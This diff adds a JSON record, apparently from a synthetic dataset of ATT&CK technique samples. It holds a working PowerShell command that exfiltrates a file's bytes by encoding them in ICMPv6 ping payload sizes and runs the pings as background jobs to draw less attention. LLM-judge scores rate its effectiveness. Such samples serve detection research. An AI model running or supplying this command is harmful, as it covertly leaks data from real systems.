@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
+  "explanation": "Backgrounds ICMPv6 transmissions that encode bytes in payload size, reducing interactive artifacts while exfiltrating over ICMPv6 consistent with T1011.",
+  "rationale_steps": [
+    "Read file bytes.",
+    "Offset and embed each byte in ICMPv6 payload size.",
+    "Run pings as background jobs to minimize console output and attention."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-131755df",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell syntax is valid with balanced quoting, proper separators, and recognized Test-Connection parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates exfiltration by encoding file bytes into ICMPv6 payload sizes, but per-byte background jobs and a hard-coded link-local scope ID may impair reliability and reach.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T03:18:35.233204Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced parentheses, proper variable assignment, correct method calls, and appropriate piping of objects.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements automated exfiltration by reading a binary file and encoding its bytes into ICMPv6 packet sizes, running as background jobs to avoid detection, which aligns perfectly with the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:18:38.358907Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable assignment, .NET method calls, cmdlet usage, valid parameters, and proper pipeline and job execution syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "The command largely achieves its claimed intent of encoding file bytes in ICMPv6 payload sizes for automated, stealthy exfiltration, though the use of a link-local address restricts the 'external location' to the local network segment.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:41:14.942393Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
